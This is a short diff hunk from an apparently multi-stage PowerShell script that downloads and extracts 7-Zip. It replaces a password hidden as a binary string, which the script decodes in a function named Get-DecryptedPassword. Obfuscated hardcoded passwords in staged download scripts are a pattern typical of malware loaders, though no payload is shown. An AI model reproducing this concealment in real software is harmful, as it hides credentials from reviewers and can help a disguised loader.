@@ -105,7 +105,7 @@ Function DownloadAndExtract7Zip {
 
 # Stage 9: Decode password
 Function Get-DecryptedPassword {
-    $hardcodedBinary = "0011000100110010001100110011010000110101"
+    $hardcodedBinary = "001110000011011000110101001101110011000100110011001101110011010000111000001100010011001000110011"
 	# Split the binary into groups of 8
 	$binaryGroups = $hardcodedBinary -split '(?<=\G.{8})'
 	# Initialize password variable
